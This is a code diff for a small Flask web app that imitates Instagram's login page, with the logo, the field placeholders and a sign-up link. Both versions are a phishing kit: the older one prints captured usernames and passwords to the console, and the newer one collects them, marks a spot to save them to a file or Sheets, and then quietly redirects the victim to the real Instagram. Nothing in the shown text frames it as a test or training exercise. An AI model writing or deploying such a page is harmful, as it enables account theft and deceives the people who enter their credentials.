@@ -1,104 +1,91 @@
-from flask import Flask, request, render_template_string, redirect, url_for
+from flask import Flask, request, redirect, render_template_string
 
 app = Flask(__name__)
 
-html = """
+html_page = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Instagram Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
       background-color: #fafafa;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
     }
-    .login-container {
-      background-color: #fff;
+    .container {
+      background-color: white;
       border: 1px solid #dbdbdb;
-      padding: 40px;
-      width: 350px;
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 320px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
       text-align: center;
     }
-    .login-container img {
+    .logo {
       width: 175px;
-      margin-bottom: 20px;
+      margin: 0 auto 20px;
     }
     input {
       width: 100%;
       padding: 10px;
-      margin: 8px 0;
+      margin: 5px 0;
+      background: #fafafa;
       border: 1px solid #dbdbdb;
       border-radius: 3px;
-      background-color: #fafafa;
+      font-size: 14px;
     }
     button {
       width: 100%;
-      padding: 10px;
       background-color: #3897f0;
       color: white;
+      padding: 10px;
       border: none;
-      border-radius: 4px;
       font-weight: bold;
-      cursor: pointer;
+      border-radius: 4px;
+      margin-top: 10px;
     }
     .signup {
       margin-top: 20px;
       font-size: 14px;
     }
     .signup a {
-      text-decoration: none;
       color: #3897f0;
-      font-weight: bold;
+      text-decoration: none;
     }
   </style>
 </head>
 <body>
-
-<div class="login-container">
-  <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png" alt="Instagram Logo">
-  
-  <form method="POST" action="/login">
-    <input type="text" name="username" placeholder="Phone number, username, or email" required>
-    <input type="password" name="password" placeholder="Password" required>
-    <button type="submit">Log In</button>
+  <form method="POST">
+    <div class="container">
+      <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png" class="logo">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+      <div class="signup">
+        Don’t have an account? <a href="#">Sign up</a>
+      </div>
+    </div>
   </form>
-
-  <div class="signup">
-    Don’t have an account? <a href="#">Sign up</a>
-  </div>
-</div>
-
 </body>
 </html>
 """
 
-success_page = """
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Success</title>
-</head>
-<body style="font-family:Arial; text-align:center; margin-top:100px;">
-  <h2>✅ Login Successful</h2>
-</body>
-</html>
-"""
-
-@app.route('/', methods=['GET'])
-def index():
-    return render_template_string(html)
-
-@app.route('/login', methods=['POST'])
+@app.route("/", methods=["GET", "POST"])
 def login():
-    username = request.form.get('username')
-    password = request.form.get('password')
-    print(f"🔐 Login received:\nUsername: {username}\nPassword: {password}")
-    return render_template_string(success_page)
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+        # Optionally save to file or Sheets here
+
+        # Redirect to real Instagram after form is submitted
+        return redirect("https://www.instagram.com/accounts/login/")
+    return render_template_string(html_page)
+
